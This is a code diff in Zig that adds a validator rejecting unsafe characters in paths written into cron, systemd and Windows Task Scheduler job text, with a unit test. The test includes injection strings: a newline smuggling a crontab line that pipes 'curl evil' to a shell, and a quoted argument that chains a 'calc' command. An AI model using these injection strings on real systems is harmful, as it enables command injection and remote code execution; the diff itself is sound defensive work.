@@ -329,6 +329,18 @@ pub fn systemdUnits(a: std.mem.Allocator, exe: []const u8, interval: Interval, e
     return .{ .service = try svc.toOwnedSlice(), .timer = timer };
 }
 
+/// A path that can go into every scheduler's job text as it is: no control
+/// characters (a newline would start a new crontab line or unit setting), no
+/// `%` (cron turns it into a newline, cmd expands it) and no `"` (it would end
+/// a quoted word in the Task Scheduler command).
+pub fn isSafeJobPath(s: []const u8) bool {
+    if (s.len == 0) return false;
+    for (s) |c| {
+        if (c < 0x20 or c == 0x7f or c == '%' or c == '"') return false;
+    }
+    return true;
+}
+
 /// Single-quote for a POSIX shell.
 fn shQuote(w: anytype, s: []const u8) !void {
     try w.writeByte('\'');
@@ -396,6 +408,15 @@ pub fn schtasksCommand(a: std.mem.Allocator, exe: []const u8, log: []const u8, e
 // ---------------------------------------------------------------------------
 
 const testing = std.testing;
+
+test "isSafeJobPath refuses what could change the job text" {
+    try testing.expect(isSafeJobPath("/home/me/.abv0/bin/abv0"));
+    try testing.expect(isSafeJobPath("C:\\Users\\Me Too\\abv0.exe"));
+    try testing.expect(!isSafeJobPath("/tmp/x\n17 * * * * curl evil|sh"));
+    try testing.expect(!isSafeJobPath("/tmp/100%"));
+    try testing.expect(!isSafeJobPath("C:\\a\"&calc&\"b"));
+    try testing.expect(!isSafeJobPath(""));
+}
 
 test "noteInstall and forget keep only what was pulled in as a dependency" {
     var tmp = testing.tmpDir(.{});
